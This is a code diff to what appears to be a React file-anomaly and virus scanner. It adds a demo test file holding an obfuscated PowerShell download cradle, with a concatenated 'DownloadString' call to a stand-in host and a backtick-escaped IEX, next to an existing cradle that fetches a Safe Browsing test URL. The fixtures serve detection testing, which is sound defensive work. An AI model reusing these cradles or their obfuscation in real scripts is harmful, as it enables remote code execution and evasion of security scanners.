@@ -139,6 +139,11 @@ export default function App() {
       `# Automated updater script\n$dropUrl = "http://testsafebrowsing.appspot.com/s/malware.html"\nWrite-Host "Fetching remote payload from $dropUrl"\n(New-Object System.Net.WebClient).DownloadFile($dropUrl, "stage2.bin")\n`
     ], "updater_c2_test.ps1", { type: "text/plain" });
 
+    // 8. Obfuscated PowerShell cradle testing AST evasion resistance (concatenation & backticks)
+    const astObfuscatedScript = new File([
+      `# Obfuscated Dynamic Memory Cradle (Tests AST parser vs regex evasion)\n$wc = New-Object System.Net.WebClient\n$wc.('Down' + 'load' + 'String').Invoke('http://suspicious-endpoint.local/stage.ps1')\n& (\`I\`Ex) ('Write-Host "Unpacked Memory Stage"')\n`
+    ], "obfuscated_cradle.ps1", { type: "text/plain" });
+
     const demoItems = [
       { file: cleanText, relativePath: "DemoFolder/documents/config.txt" },
       { file: highEntropyText, relativePath: "DemoFolder/documents/audit_notes.txt" },
@@ -146,12 +151,13 @@ export default function App() {
       { file: doubleExt, relativePath: "DemoFolder/downloads/Q3_Financial_Report.pdf.exe" },
       { file: scriptCradle, relativePath: "DemoFolder/scripts/deploy_updater.ps1" },
       { file: eicarFile, relativePath: "DemoFolder/threats/eicar_antivirus_test.com.txt" },
-      { file: safeBrowsingTestScript, relativePath: "DemoFolder/scripts/updater_c2_test.ps1" }
+      { file: safeBrowsingTestScript, relativePath: "DemoFolder/scripts/updater_c2_test.ps1" },
+      { file: astObfuscatedScript, relativePath: "DemoFolder/scripts/obfuscated_cradle.ps1" }
     ];
 
     setFolderPath("DemoFolder");
     setFileItems(demoItems);
-    addLog("[DEMO] Injected 7 test files into queue: Standard EICAR Antivirus Test file, Google Safe Browsing malware URL script, masqueraded PNG, high entropy TXT, double extension .pdf.exe, PowerShell cradle, and clean config.");
+    addLog("[DEMO] Injected 8 test files: EICAR Antivirus Test, Google Safe Browsing test URL, AST Obfuscated PowerShell Cradle, PE masquerade, high entropy TXT, double extension .pdf.exe, base64 cradle, and clean config.");
   };
 
   return (
@@ -161,10 +167,10 @@ export default function App() {
         <div className="app-title-area">
           <div className="title-with-badge">
             <h1>File Anomaly &amp; Virus Scanner</h1>
-            <span className="version-pill">v2.0 Threat Intel</span>
+            <span className="version-pill">v2.5 Threat Intel &amp; AST</span>
           </div>
           <div className="app-subtitle">
-            Heuristic Structural Inspection + VirusTotal Antivirus Engine + Google Safe Browsing
+            Zero-OOM Streaming Heuristics + PowerShell AST Engine + VirusTotal v3 &amp; Safe Browsing
           </div>
         </div>
 
@@ -273,6 +279,8 @@ export default function App() {
         anomalies={report ? report.anomalies : []}
         summary={report ? report.summary : null}
         files={report ? report.files : []}
+        fileItems={fileItems}
+        onLog={addLog}
       />
 
       {/* Security API Settings Modal */}
